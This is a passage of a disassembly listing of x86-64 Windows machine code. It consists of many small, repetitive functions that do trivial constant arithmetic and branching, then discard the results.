   1400032d5:	5e                   	pop    %rsi
   1400032d6:	5b                   	pop    %rbx
   1400032d7:	c3                   	ret
   1400032d8:	53                   	push   %rbx
   1400032d9:	56                   	push   %rsi
   1400032da:	57                   	push   %rdi
   1400032db:	41 54                	push   %r12
   1400032dd:	41 55                	push   %r13
   1400032df:	48 83 ec 20          	sub    $0x20,%rsp
   1400032e3:	b8 04 00 00 00       	mov    $0x4,%eax
   1400032e8:	83 c0 04             	add    $0x4,%eax
   1400032eb:	d1 e0                	shl    $1,%eax
   1400032ed:	83 f8 0a             	cmp    $0xa,%eax
   1400032f0:	7c 03                	jl     0x1400032f5
   1400032f2:	83 e8 05             	sub    $0x5,%eax
   1400032f5:	48 83 c4 20          	add    $0x20,%rsp
   1400032f9:	41 5d                	pop    %r13
   1400032fb:	41 5c                	pop    %r12
   1400032fd:	5f                   	pop    %rdi
   1400032fe:	5e                   	pop    %rsi
   1400032ff:	5b                   	pop    %rbx
   140003300:	c3                   	ret
   140003301:	53                   	push   %rbx
   140003302:	56                   	push   %rsi
   140003303:	57                   	push   %rdi
   140003304:	41 54                	push   %r12
   140003306:	41 55                	push   %r13
   140003308:	48 83 ec 20          	sub    $0x20,%rsp
   14000330c:	48 c7 c0 01 00 00 00 	mov    $0x1,%rax
   140003313:	48 8d 58 01          	lea    0x1(%rax),%rbx
   140003317:	48 01 d8             	add    %rbx,%rax
   14000331a:	48 83 c4 20          	add    $0x20,%rsp
   14000331e:	41 5d                	pop    %r13
   140003320:	41 5c                	pop    %r12
   140003322:	5f                   	pop    %rdi
   140003323:	5e                   	pop    %rsi
   140003324:	5b                   	pop    %rbx
   140003325:	c3                   	ret
   140003326:	53                   	push   %rbx
   140003327:	56                   	push   %rsi
   140003328:	57                   	push   %rdi
   140003329:	41 54                	push   %r12
   14000332b:	41 55                	push   %r13
   14000332d:	48 83 ec 20          	sub    $0x20,%rsp
   140003331:	b8 1c 00 00 00       	mov    $0x1c,%eax
   140003336:	6b c0 02             	imul   $0x2,%eax,%eax
   140003339:	83 c0 12             	add    $0x12,%eax
   14000333c:	6b c0 03             	imul   $0x3,%eax,%eax
   14000333f:	48 83 c4 20          	add    $0x20,%rsp
   140003343:	41 5d                	pop    %r13
   140003345:	41 5c                	pop    %r12
   140003347:	5f                   	pop    %rdi
   140003348:	5e                   	pop    %rsi
   140003349:	5b                   	pop    %rbx
   14000334a:	c3                   	ret
   14000334b:	53                   	push   %rbx
   14000334c:	56                   	push   %rsi
   14000334d:	57                   	push   %rdi
   14000334e:	41 54                	push   %r12
   140003350:	41 55                	push   %r13
   140003352:	48 83 ec 20          	sub    $0x20,%rsp
   140003356:	b8 ac 00 00 00       	mov    $0xac,%eax
   14000335b:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003360:	31 d2                	xor    %edx,%edx
   140003362:	f7 f1                	div    %ecx
   140003364:	48 83 c4 20          	add    $0x20,%rsp
   140003368:	41 5d                	pop    %r13
   14000336a:	41 5c                	pop    %r12
   14000336c:	5f                   	pop    %rdi
   14000336d:	5e                   	pop    %rsi
   14000336e:	5b                   	pop    %rbx
   14000336f:	c3                   	ret
   140003370:	53                   	push   %rbx
   140003371:	56                   	push   %rsi
   140003372:	57                   	push   %rdi
   140003373:	41 54                	push   %r12
   140003375:	41 55                	push   %r13
   140003377:	48 83 ec 20          	sub    $0x20,%rsp
   14000337b:	b8 c3 00 00 00       	mov    $0xc3,%eax
   140003380:	d1 e0                	shl    $1,%eax
   140003382:	72 02                	jb     0x140003386
   140003384:	d1 e8                	shr    $1,%eax
   140003386:	48 83 c4 20          	add    $0x20,%rsp
   14000338a:	41 5d                	pop    %r13
   14000338c:	41 5c                	pop    %r12
   14000338e:	5f                   	pop    %rdi
   14000338f:	5e                   	pop    %rsi
   140003390:	5b                   	pop    %rbx
   140003391:	c3                   	ret
   140003392:	53                   	push   %rbx
   140003393:	56                   	push   %rsi
   140003394:	57                   	push   %rdi
   140003395:	41 54                	push   %r12
   140003397:	41 55                	push   %r13
   140003399:	48 83 ec 20          	sub    $0x20,%rsp
   14000339d:	6a 2e                	push   $0x2e
   14000339f:	6a 51                	push   $0x51
   1400033a1:	58                   	pop    %rax
   1400033a2:	5b                   	pop    %rbx
   1400033a3:	48 01 d8             	add    %rbx,%rax
   1400033a6:	48 83 c4 20          	add    $0x20,%rsp
   1400033aa:	41 5d                	pop    %r13
   1400033ac:	41 5c                	pop    %r12
   1400033ae:	5f                   	pop    %rdi
   1400033af:	5e                   	pop    %rsi
   1400033b0:	5b                   	pop    %rbx
   1400033b1:	c3                   	ret
   1400033b2:	53                   	push   %rbx
   1400033b3:	56                   	push   %rsi
   1400033b4:	57                   	push   %rdi
   1400033b5:	41 54                	push   %r12
   1400033b7:	41 55                	push   %r13
   1400033b9:	48 83 ec 20          	sub    $0x20,%rsp
   1400033bd:	b8 13 00 00 00       	mov    $0x13,%eax
   1400033c2:	d1 e0                	shl    $1,%eax
   1400033c4:	d1 e8                	shr    $1,%eax
   1400033c6:	83 e0 0f             	and    $0xf,%eax
   1400033c9:	48 83 c4 20          	add    $0x20,%rsp
   1400033cd:	41 5d                	pop    %r13
   1400033cf:	41 5c                	pop    %r12
   1400033d1:	5f                   	pop    %rdi
   1400033d2:	5e                   	pop    %rsi
   1400033d3:	5b                   	pop    %rbx
   1400033d4:	c3                   	ret
   1400033d5:	53                   	push   %rbx
   1400033d6:	56                   	push   %rsi
   1400033d7:	57                   	push   %rdi
   1400033d8:	41 54                	push   %r12
   1400033da:	41 55                	push   %r13
   1400033dc:	48 83 ec 20          	sub    $0x20,%rsp
   1400033e0:	31 c0                	xor    %eax,%eax
   1400033e2:	b9 03 00 00 00       	mov    $0x3,%ecx
   1400033e7:	83 c0 04             	add    $0x4,%eax
   1400033ea:	83 f8 0a             	cmp    $0xa,%eax
   1400033ed:	7f 04                	jg     0x1400033f3
   1400033ef:	ff c9                	dec    %ecx
   1400033f1:	75 f4                	jne    0x1400033e7
   1400033f3:	48 83 c4 20          	add    $0x20,%rsp
   1400033f7:	41 5d                	pop    %r13
   1400033f9:	41 5c                	pop    %r12
   1400033fb:	5f                   	pop    %rdi
   1400033fc:	5e                   	pop    %rsi
   1400033fd:	5b                   	pop    %rbx
   1400033fe:	c3                   	ret
   1400033ff:	53                   	push   %rbx
   140003400:	56                   	push   %rsi
   140003401:	57                   	push   %rdi
   140003402:	41 54                	push   %r12
   140003404:	41 55                	push   %r13
   140003406:	48 83 ec 20          	sub    $0x20,%rsp
   14000340a:	e8 4b dc ff ff       	call   0x14000105a
   14000340f:	25 ff 00 00 00       	and    $0xff,%eax
   140003414:	b8 49 00 00 00       	mov    $0x49,%eax
   140003419:	83 e0 0f             	and    $0xf,%eax
   14000341c:	83 f8 16             	cmp    $0x16,%eax
   14000341f:	7c 0a                	jl     0x14000342b
   140003421:	83 f8 3d             	cmp    $0x3d,%eax
   140003424:	7f 0a                	jg     0x140003430
   140003426:	83 c0 0a             	add    $0xa,%eax
   140003429:	eb 08                	jmp    0x140003433
   14000342b:	83 c0 05             	add    $0x5,%eax
   14000342e:	eb 03                	jmp    0x140003433
   140003430:	83 e8 05             	sub    $0x5,%eax
   140003433:	48 83 c4 20          	add    $0x20,%rsp
   140003437:	41 5d                	pop    %r13
   140003439:	41 5c                	pop    %r12
   14000343b:	5f                   	pop    %rdi
   14000343c:	5e                   	pop    %rsi
   14000343d:	5b                   	pop    %rbx
   14000343e:	c3                   	ret
   14000343f:	53                   	push   %rbx
   140003440:	56                   	push   %rsi
   140003441:	57                   	push   %rdi
   140003442:	41 54                	push   %r12
   140003444:	41 55                	push   %r13
   140003446:	48 83 ec 20          	sub    $0x20,%rsp
   14000344a:	e8 0b dc ff ff       	call   0x14000105a
   14000344f:	25 ff 00 00 00       	and    $0xff,%eax
   140003454:	b8 40 00 00 00       	mov    $0x40,%eax
   140003459:	bb 29 00 00 00       	mov    $0x29,%ebx
   14000345e:	83 f8 1e             	cmp    $0x1e,%eax
   140003461:	7c 09                	jl     0x14000346c
   140003463:	83 fb 46             	cmp    $0x46,%ebx
   140003466:	7f 09                	jg     0x140003471
   140003468:	01 d8                	add    %ebx,%eax
   14000346a:	eb 08                	jmp    0x140003474
   14000346c:	83 e8 05             	sub    $0x5,%eax
   14000346f:	eb 03                	jmp    0x140003474
   140003471:	83 c3 0a             	add    $0xa,%ebx
   140003474:	48 83 c4 20          	add    $0x20,%rsp
   140003478:	41 5d                	pop    %r13
   14000347a:	41 5c                	pop    %r12
   14000347c:	5f                   	pop    %rdi
   14000347d:	5e                   	pop    %rsi
   14000347e:	5b                   	pop    %rbx
   14000347f:	c3                   	ret
   140003480:	53                   	push   %rbx
   140003481:	56                   	push   %rsi
   140003482:	57                   	push   %rdi
   140003483:	41 54                	push   %r12
   140003485:	41 55                	push   %r13
   140003487:	48 83 ec 20          	sub    $0x20,%rsp
   14000348b:	e8 ca db ff ff       	call   0x14000105a
   140003490:	25 ff 00 00 00       	and    $0xff,%eax
   140003495:	b8 30 00 00 00       	mov    $0x30,%eax
   14000349a:	83 c0 0b             	add    $0xb,%eax
   14000349d:	71 07                	jno    0x1400034a6
   14000349f:	b8 00 00 00 00       	mov    $0x0,%eax
   1400034a4:	eb 03                	jmp    0x1400034a9
   1400034a6:	83 e8 02             	sub    $0x2,%eax
   1400034a9:	48 83 c4 20          	add    $0x20,%rsp
   1400034ad:	41 5d                	pop    %r13
   1400034af:	41 5c                	pop    %r12
   1400034b1:	5f                   	pop    %rdi
   1400034b2:	5e                   	pop    %rsi
   1400034b3:	5b                   	pop    %rbx
   1400034b4:	c3                   	ret
   1400034b5:	53                   	push   %rbx
   1400034b6:	56                   	push   %rsi
   1400034b7:	57                   	push   %rdi
   1400034b8:	41 54                	push   %r12
   1400034ba:	41 55                	push   %r13
   1400034bc:	48 83 ec 20          	sub    $0x20,%rsp
   1400034c0:	b8 99 00 00 00       	mov    $0x99,%eax
   1400034c5:	c1 e0 02             	shl    $0x2,%eax
   1400034c8:	d1 e8                	shr    $1,%eax
   1400034ca:	83 e0 0f             	and    $0xf,%eax
   1400034cd:	48 83 c4 20          	add    $0x20,%rsp
   1400034d1:	41 5d                	pop    %r13
   1400034d3:	41 5c                	pop    %r12
   1400034d5:	5f                   	pop    %rdi
   1400034d6:	5e                   	pop    %rsi
   1400034d7:	5b                   	pop    %rbx
   1400034d8:	c3                   	ret
   1400034d9:	53                   	push   %rbx
   1400034da:	56                   	push   %rsi
   1400034db:	57                   	push   %rdi
   1400034dc:	41 54                	push   %r12
   1400034de:	41 55                	push   %r13
   1400034e0:	48 83 ec 20          	sub    $0x20,%rsp
   1400034e4:	b8 1b 00 00 00       	mov    $0x1b,%eax
   1400034e9:	bb 15 00 00 00       	mov    $0x15,%ebx
   1400034ee:	83 f8 1e             	cmp    $0x1e,%eax
   1400034f1:	7c 09                	jl     0x1400034fc
   1400034f3:	83 fb 46             	cmp    $0x46,%ebx
   1400034f6:	7f 09                	jg     0x140003501
   1400034f8:	01 d8                	add    %ebx,%eax
   1400034fa:	eb 08                	jmp    0x140003504
   1400034fc:	83 e8 05             	sub    $0x5,%eax
   1400034ff:	eb 03                	jmp    0x140003504
   140003501:	83 c3 0a             	add    $0xa,%ebx
   140003504:	48 83 c4 20          	add    $0x20,%rsp
   140003508:	41 5d                	pop    %r13
   14000350a:	41 5c                	pop    %r12
   14000350c:	5f                   	pop    %rdi
   14000350d:	5e                   	pop    %rsi
   14000350e:	5b                   	pop    %rbx
   14000350f:	c3                   	ret
   140003510:	53                   	push   %rbx
   140003511:	56                   	push   %rsi
   140003512:	57                   	push   %rdi
   140003513:	41 54                	push   %r12
   140003515:	41 55                	push   %r13
   140003517:	48 83 ec 20          	sub    $0x20,%rsp
   14000351b:	e8 3a db ff ff       	call   0x14000105a
   140003520:	25 ff 00 00 00       	and    $0xff,%eax
   140003525:	b8 7e 00 00 00       	mov    $0x7e,%eax
   14000352a:	b9 02 00 00 00       	mov    $0x2,%ecx
   14000352f:	31 d2                	xor    %edx,%edx
   140003531:	f7 f1                	div    %ecx
   140003533:	48 83 c4 20          	add    $0x20,%rsp
   140003537:	41 5d                	pop    %r13
   140003539:	41 5c                	pop    %r12
   14000353b:	5f                   	pop    %rdi
   14000353c:	5e                   	pop    %rsi
   14000353d:	5b                   	pop    %rbx
   14000353e:	c3                   	ret
   14000353f:	53                   	push   %rbx
   140003540:	56                   	push   %rsi
   140003541:	57                   	push   %rdi
   140003542:	41 54                	push   %r12
   140003544:	41 55                	push   %r13
   140003546:	48 83 ec 20          	sub    $0x20,%rsp
   14000354a:	6a 24                	push   $0x24
   14000354c:	6a 3d                	push   $0x3d
   14000354e:	58                   	pop    %rax
   14000354f:	5b                   	pop    %rbx
   140003550:	48 01 d8             	add    %rbx,%rax
   140003553:	48 83 c4 20          	add    $0x20,%rsp
   140003557:	41 5d                	pop    %r13
   140003559:	41 5c                	pop    %r12
   14000355b:	5f                   	pop    %rdi
   14000355c:	5e                   	pop    %rsi
   14000355d:	5b                   	pop    %rbx
   14000355e:	c3                   	ret
   14000355f:	53                   	push   %rbx
   140003560:	56                   	push   %rsi
   140003561:	57                   	push   %rdi
   140003562:	41 54                	push   %r12
   140003564:	41 55                	push   %r13
   140003566:	48 83 ec 20          	sub    $0x20,%rsp
   14000356a:	e8 eb da ff ff       	call   0x14000105a
   14000356f:	25 ff 00 00 00       	and    $0xff,%eax
   140003574:	b8 09 00 00 00       	mov    $0x9,%eax
   140003579:	bb 0b 00 00 00       	mov    $0xb,%ebx
   14000357e:	01 d8                	add    %ebx,%eax
   140003580:	d1 e0                	shl    $1,%eax
   140003582:	48 83 c4 20          	add    $0x20,%rsp
   140003586:	41 5d                	pop    %r13
   140003588:	41 5c                	pop    %r12
   14000358a:	5f                   	pop    %rdi
   14000358b:	5e                   	pop    %rsi
   14000358c:	5b                   	pop    %rbx
   14000358d:	c3                   	ret
   14000358e:	53                   	push   %rbx
   14000358f:	56                   	push   %rsi
   140003590:	57                   	push   %rdi
   140003591:	41 54                	push   %r12
   140003593:	41 55                	push   %r13
   140003595:	48 83 ec 20          	sub    $0x20,%rsp
   140003599:	b8 ca 00 00 00       	mov    $0xca,%eax
   14000359e:	c1 c0 03             	rol    $0x3,%eax
   1400035a1:	d1 c8                	ror    $1,%eax
   1400035a3:	d1 e0                	shl    $1,%eax
   1400035a5:	48 83 c4 20          	add    $0x20,%rsp
   1400035a9:	41 5d                	pop    %r13
   1400035ab:	41 5c                	pop    %r12
   1400035ad:	5f                   	pop    %rdi
   1400035ae:	5e                   	pop    %rsi
   1400035af:	5b                   	pop    %rbx
   1400035b0:	c3                   	ret
   1400035b1:	53                   	push   %rbx
   1400035b2:	56                   	push   %rsi
   1400035b3:	57                   	push   %rdi
   1400035b4:	41 54                	push   %r12
   1400035b6:	41 55                	push   %r13
   1400035b8:	48 83 ec 20          	sub    $0x20,%rsp
   1400035bc:	b8 13 00 00 00       	mov    $0x13,%eax
   1400035c1:	83 f8 32             	cmp    $0x32,%eax
   1400035c4:	7f 05                	jg     0x1400035cb
   1400035c6:	6b c0 02             	imul   $0x2,%eax,%eax
   1400035c9:	eb 03                	jmp    0x1400035ce
   1400035cb:	6b c0 03             	imul   $0x3,%eax,%eax
   1400035ce:	48 83 c4 20          	add    $0x20,%rsp
   1400035d2:	41 5d                	pop    %r13
   1400035d4:	41 5c                	pop    %r12
   1400035d6:	5f                   	pop    %rdi
   1400035d7:	5e                   	pop    %rsi
   1400035d8:	5b                   	pop    %rbx
   1400035d9:	c3                   	ret
   1400035da:	53                   	push   %rbx
   1400035db:	56                   	push   %rsi
   1400035dc:	57                   	push   %rdi
   1400035dd:	41 54                	push   %r12
   1400035df:	41 55                	push   %r13
   1400035e1:	48 83 ec 20          	sub    $0x20,%rsp
   1400035e5:	e8 70 da ff ff       	call   0x14000105a
   1400035ea:	25 ff 00 00 00       	and    $0xff,%eax
   1400035ef:	b8 56 00 00 00       	mov    $0x56,%eax
   1400035f4:	a9 01 00 00 00       	test   $0x1,%eax
   1400035f9:	74 05                	je     0x140003600
   1400035fb:	83 c0 0a             	add    $0xa,%eax
   1400035fe:	eb 03                	jmp    0x140003603
   140003600:	83 e8 05             	sub    $0x5,%eax
   140003603:	48 83 c4 20          	add    $0x20,%rsp
   140003607:	41 5d                	pop    %r13
   140003609:	41 5c                	pop    %r12
   14000360b:	5f                   	pop    %rdi
   14000360c:	5e                   	pop    %rsi
   14000360d:	5b                   	pop    %rbx
   14000360e:	c3                   	ret
   14000360f:	53                   	push   %rbx
   140003610:	56                   	push   %rsi
   140003611:	57                   	push   %rdi
   140003612:	41 54                	push   %r12
   140003614:	41 55                	push   %r13
   140003616:	48 83 ec 20          	sub    $0x20,%rsp
   14000361a:	b8 43 00 00 00       	mov    $0x43,%eax
   14000361f:	83 e0 0f             	and    $0xf,%eax
   140003622:	83 f8 1f             	cmp    $0x1f,%eax
   140003625:	7c 0a                	jl     0x140003631
   140003627:	83 f8 3e             	cmp    $0x3e,%eax
   14000362a:	7f 0a                	jg     0x140003636
   14000362c:	83 c0 0a             	add    $0xa,%eax
   14000362f:	eb 08                	jmp    0x140003639
   140003631:	83 c0 05             	add    $0x5,%eax
   140003634:	eb 03                	jmp    0x140003639
   140003636:	83 e8 05             	sub    $0x5,%eax
   140003639:	48 83 c4 20          	add    $0x20,%rsp
   14000363d:	41 5d                	pop    %r13
   14000363f:	41 5c                	pop    %r12
   140003641:	5f                   	pop    %rdi
   140003642:	5e                   	pop    %rsi
   140003643:	5b                   	pop    %rbx
   140003644:	c3                   	ret
   140003645:	53                   	push   %rbx
   140003646:	56                   	push   %rsi
   140003647:	57                   	push   %rdi
   140003648:	41 54                	push   %r12
   14000364a:	41 55                	push   %r13
   14000364c:	48 83 ec 20          	sub    $0x20,%rsp
   140003650:	b8 5f 00 00 00       	mov    $0x5f,%eax
   140003655:	83 e0 01             	and    $0x1,%eax
   140003658:	74 07                	je     0x140003661
   14000365a:	b8 1b 00 00 00       	mov    $0x1b,%eax
   14000365f:	eb 05                	jmp    0x140003666
   140003661:	b8 26 00 00 00       	mov    $0x26,%eax
   140003666:	48 83 c4 20          	add    $0x20,%rsp
   14000366a:	41 5d                	pop    %r13
   14000366c:	41 5c                	pop    %r12
   14000366e:	5f                   	pop    %rdi
   14000366f:	5e                   	pop    %rsi
   140003670:	5b                   	pop    %rbx
   140003671:	c3                   	ret
   140003672:	53                   	push   %rbx
   140003673:	56                   	push   %rsi
   140003674:	57                   	push   %rdi
   140003675:	41 54                	push   %r12
   140003677:	41 55                	push   %r13
   140003679:	48 83 ec 20          	sub    $0x20,%rsp
   14000367d:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003682:	31 c0                	xor    %eax,%eax
   140003684:	83 c0 01             	add    $0x1,%eax
   140003687:	ff c9                	dec    %ecx
   140003689:	75 f9                	jne    0x140003684
   14000368b:	48 83 c4 20          	add    $0x20,%rsp
   14000368f:	41 5d                	pop    %r13
   140003691:	41 5c                	pop    %r12
   140003693:	5f                   	pop    %rdi
   140003694:	5e                   	pop    %rsi
   140003695:	5b                   	pop    %rbx
   140003696:	c3                   	ret
   140003697:	53                   	push   %rbx
   140003698:	56                   	push   %rsi
   140003699:	57                   	push   %rdi
   14000369a:	41 54                	push   %r12
   14000369c:	41 55                	push   %r13
   14000369e:	48 83 ec 20          	sub    $0x20,%rsp
   1400036a2:	b8 17 00 00 00       	mov    $0x17,%eax
   1400036a7:	bb 29 00 00 00       	mov    $0x29,%ebx
   1400036ac:	83 f8 1e             	cmp    $0x1e,%eax
   1400036af:	7c 09                	jl     0x1400036ba
   1400036b1:	83 fb 46             	cmp    $0x46,%ebx
   1400036b4:	7f 09                	jg     0x1400036bf
   1400036b6:	01 d8                	add    %ebx,%eax
   1400036b8:	eb 08                	jmp    0x1400036c2
   1400036ba:	83 e8 05             	sub    $0x5,%eax
   1400036bd:	eb 03                	jmp    0x1400036c2
   1400036bf:	83 c3 0a             	add    $0xa,%ebx
   1400036c2:	48 83 c4 20          	add    $0x20,%rsp
   1400036c6:	41 5d                	pop    %r13
   1400036c8:	41 5c                	pop    %r12
   1400036ca:	5f                   	pop    %rdi
   1400036cb:	5e                   	pop    %rsi
   1400036cc:	5b                   	pop    %rbx
   1400036cd:	c3                   	ret
   1400036ce:	53                   	push   %rbx
   1400036cf:	56                   	push   %rsi
   1400036d0:	57                   	push   %rdi
   1400036d1:	41 54                	push   %r12
   1400036d3:	41 55                	push   %r13
   1400036d5:	48 83 ec 20          	sub    $0x20,%rsp
   1400036d9:	b8 38 00 00 00       	mov    $0x38,%eax
   1400036de:	83 c0 27             	add    $0x27,%eax
   1400036e1:	83 c0 18             	add    $0x18,%eax
   1400036e4:	83 c0 0d             	add    $0xd,%eax
   1400036e7:	48 83 c4 20          	add    $0x20,%rsp
   1400036eb:	41 5d                	pop    %r13
   1400036ed:	41 5c                	pop    %r12
   1400036ef:	5f                   	pop    %rdi
   1400036f0:	5e                   	pop    %rsi
   1400036f1:	5b                   	pop    %rbx
   1400036f2:	c3                   	ret
   1400036f3:	53                   	push   %rbx
   1400036f4:	56                   	push   %rsi
   1400036f5:	57                   	push   %rdi
   1400036f6:	41 54                	push   %r12
   1400036f8:	41 55                	push   %r13
   1400036fa:	48 83 ec 20          	sub    $0x20,%rsp
   1400036fe:	31 c0                	xor    %eax,%eax
   140003700:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003705:	83 c0 02             	add    $0x2,%eax
   140003708:	83 f8 0a             	cmp    $0xa,%eax
   14000370b:	7f 04                	jg     0x140003711
   14000370d:	ff c9                	dec    %ecx
   14000370f:	75 f4                	jne    0x140003705
   140003711:	48 83 c4 20          	add    $0x20,%rsp
   140003715:	41 5d                	pop    %r13
   140003717:	41 5c                	pop    %r12
   140003719:	5f                   	pop    %rdi
   14000371a:	5e                   	pop    %rsi
   14000371b:	5b                   	pop    %rbx
   14000371c:	c3                   	ret
   14000371d:	53                   	push   %rbx
   14000371e:	56                   	push   %rsi
   14000371f:	57                   	push   %rdi
   140003720:	41 54                	push   %r12
   140003722:	41 55                	push   %r13
   140003724:	48 83 ec 20          	sub    $0x20,%rsp
   140003728:	e8 2d d9 ff ff       	call   0x14000105a
   14000372d:	25 ff 00 00 00       	and    $0xff,%eax
   140003732:	6a 05                	push   $0x5
   140003734:	6a 10                	push   $0x10
   140003736:	6a 19                	push   $0x19
   140003738:	58                   	pop    %rax
   140003739:	5b                   	pop    %rbx
   14000373a:	59                   	pop    %rcx
   14000373b:	48 83 c4 20          	add    $0x20,%rsp
   14000373f:	41 5d                	pop    %r13
   140003741:	41 5c                	pop    %r12
   140003743:	5f                   	pop    %rdi
   140003744:	5e                   	pop    %rsi
   140003745:	5b                   	pop    %rbx
   140003746:	c3                   	ret
   140003747:	53                   	push   %rbx
   140003748:	56                   	push   %rsi
   140003749:	57                   	push   %rdi
   14000374a:	41 54                	push   %r12
   14000374c:	41 55                	push   %r13
   14000374e:	48 83 ec 20          	sub    $0x20,%rsp
   140003752:	b8 35 00 00 00       	mov    $0x35,%eax
   140003757:	a9 01 00 00 00       	test   $0x1,%eax
   14000375c:	74 05                	je     0x140003763
   14000375e:	83 c0 0a             	add    $0xa,%eax
   140003761:	eb 03                	jmp    0x140003766
   140003763:	83 e8 05             	sub    $0x5,%eax
   140003766:	48 83 c4 20          	add    $0x20,%rsp
   14000376a:	41 5d                	pop    %r13
   14000376c:	41 5c                	pop    %r12
   14000376e:	5f                   	pop    %rdi
   14000376f:	5e                   	pop    %rsi
   140003770:	5b                   	pop    %rbx
   140003771:	c3                   	ret
   140003772:	53                   	push   %rbx
   140003773:	56                   	push   %rsi
   140003774:	57                   	push   %rdi
   140003775:	41 54                	push   %r12
   140003777:	41 55                	push   %r13
   140003779:	48 83 ec 20          	sub    $0x20,%rsp
   14000377d:	b8 18 00 00 00       	mov    $0x18,%eax
   140003782:	83 c0 1e             	add    $0x1e,%eax
   140003785:	72 05                	jb     0x14000378c
   140003787:	83 c0 05             	add    $0x5,%eax
   14000378a:	eb 03                	jmp    0x14000378f
   14000378c:	83 c0 0a             	add    $0xa,%eax
   14000378f:	48 83 c4 20          	add    $0x20,%rsp
   140003793:	41 5d                	pop    %r13
   140003795:	41 5c                	pop    %r12
   140003797:	5f                   	pop    %rdi
   140003798:	5e                   	pop    %rsi
   140003799:	5b                   	pop    %rbx
   14000379a:	c3                   	ret
   14000379b:	53                   	push   %rbx
   14000379c:	56                   	push   %rsi
   14000379d:	57                   	push   %rdi
   14000379e:	41 54                	push   %r12
   1400037a0:	41 55                	push   %r13
   1400037a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400037a6:	e8 af d8 ff ff       	call   0x14000105a
   1400037ab:	25 ff 00 00 00       	and    $0xff,%eax
   1400037b0:	6a 26                	push   $0x26
   1400037b2:	6a 15                	push   $0x15
   1400037b4:	58                   	pop    %rax
   1400037b5:	5b                   	pop    %rbx
   1400037b6:	48 83 c4 20          	add    $0x20,%rsp
   1400037ba:	41 5d                	pop    %r13
   1400037bc:	41 5c                	pop    %r12
   1400037be:	5f                   	pop    %rdi
   1400037bf:	5e                   	pop    %rsi
   1400037c0:	5b                   	pop    %rbx
   1400037c1:	c3                   	ret
   1400037c2:	53                   	push   %rbx
   1400037c3:	56                   	push   %rsi
   1400037c4:	57                   	push   %rdi
   1400037c5:	41 54                	push   %r12
   1400037c7:	41 55                	push   %r13
   1400037c9:	48 83 ec 20          	sub    $0x20,%rsp
   1400037cd:	e8 88 d8 ff ff       	call   0x14000105a
   1400037d2:	25 ff 00 00 00       	and    $0xff,%eax
   1400037d7:	6a 0c                	push   $0xc
   1400037d9:	6a 03                	push   $0x3
   1400037db:	58                   	pop    %rax
   1400037dc:	5b                   	pop    %rbx
   1400037dd:	48 01 d8             	add    %rbx,%rax
   1400037e0:	48 83 c4 20          	add    $0x20,%rsp
   1400037e4:	41 5d                	pop    %r13
   1400037e6:	41 5c                	pop    %r12
   1400037e8:	5f                   	pop    %rdi
   1400037e9:	5e                   	pop    %rsi
   1400037ea:	5b                   	pop    %rbx
   1400037eb:	c3                   	ret
   1400037ec:	53                   	push   %rbx
   1400037ed:	56                   	push   %rsi
   1400037ee:	57                   	push   %rdi
   1400037ef:	41 54                	push   %r12
   1400037f1:	41 55                	push   %r13
   1400037f3:	48 83 ec 20          	sub    $0x20,%rsp
   1400037f7:	b8 2b 00 00 00       	mov    $0x2b,%eax
   1400037fc:	bb 2e 00 00 00       	mov    $0x2e,%ebx
   140003801:	01 d8                	add    %ebx,%eax
   140003803:	d1 e0                	shl    $1,%eax
   140003805:	48 83 c4 20          	add    $0x20,%rsp
   140003809:	41 5d                	pop    %r13
   14000380b:	41 5c                	pop    %r12
   14000380d:	5f                   	pop    %rdi
   14000380e:	5e                   	pop    %rsi
   14000380f:	5b                   	pop    %rbx
   140003810:	c3                   	ret
   140003811:	53                   	push   %rbx
   140003812:	56                   	push   %rsi
   140003813:	57                   	push   %rdi
   140003814:	41 54                	push   %r12
   140003816:	41 55                	push   %r13
   140003818:	48 83 ec 20          	sub    $0x20,%rsp
   14000381c:	b8 01 00 00 00       	mov    $0x1,%eax
   140003821:	b9 02 00 00 00       	mov    $0x2,%ecx
   140003826:	0f af c1             	imul   %ecx,%eax
   140003829:	ff c9                	dec    %ecx
   14000382b:	75 f9                	jne    0x140003826
   14000382d:	48 83 c4 20          	add    $0x20,%rsp
   140003831:	41 5d                	pop    %r13
   140003833:	41 5c                	pop    %r12
   140003835:	5f                   	pop    %rdi
   140003836:	5e                   	pop    %rsi
   140003837:	5b                   	pop    %rbx
   140003838:	c3                   	ret
   140003839:	53                   	push   %rbx
   14000383a:	56                   	push   %rsi
   14000383b:	57                   	push   %rdi
   14000383c:	41 54                	push   %r12
   14000383e:	41 55                	push   %r13
   140003840:	48 83 ec 20          	sub    $0x20,%rsp
   140003844:	b8 06 00 00 00       	mov    $0x6,%eax
   140003849:	bb 16 00 00 00       	mov    $0x16,%ebx
   14000384e:	21 d8                	and    %ebx,%eax
   140003850:	83 cb 03             	or     $0x3,%ebx
   140003853:	48 83 c4 20          	add    $0x20,%rsp
   140003857:	41 5d                	pop    %r13
   140003859:	41 5c                	pop    %r12
   14000385b:	5f                   	pop    %rdi
   14000385c:	5e                   	pop    %rsi
   14000385d:	5b                   	pop    %rbx
   14000385e:	c3                   	ret
   14000385f:	53                   	push   %rbx
   140003860:	56                   	push   %rsi
   140003861:	57                   	push   %rdi
   140003862:	41 54                	push   %r12
   140003864:	41 55                	push   %r13
   140003866:	48 83 ec 20          	sub    $0x20,%rsp
   14000386a:	6a 09                	push   $0x9
   14000386c:	58                   	pop    %rax
   14000386d:	50                   	push   %rax
   14000386e:	5b                   	pop    %rbx
   14000386f:	48 83 c4 20          	add    $0x20,%rsp
   140003873:	41 5d                	pop    %r13
   140003875:	41 5c                	pop    %r12
   140003877:	5f                   	pop    %rdi
   140003878:	5e                   	pop    %rsi
   140003879:	5b                   	pop    %rbx
   14000387a:	c3                   	ret
   14000387b:	53                   	push   %rbx
   14000387c:	56                   	push   %rsi
   14000387d:	57                   	push   %rdi
   14000387e:	41 54                	push   %r12
   140003880:	41 55                	push   %r13
   140003882:	48 83 ec 20          	sub    $0x20,%rsp
   140003886:	b8 67 00 00 00       	mov    $0x67,%eax
   14000388b:	bb bf 00 00 00       	mov    $0xbf,%ebx
   140003890:	21 d8                	and    %ebx,%eax
   140003892:	09 c3                	or     %eax,%ebx
   140003894:	f7 d0                	not    %eax
   140003896:	01 d8                	add    %ebx,%eax
   140003898:	48 83 c4 20          	add    $0x20,%rsp
   14000389c:	41 5d                	pop    %r13
   14000389e:	41 5c                	pop    %r12
   1400038a0:	5f                   	pop    %rdi
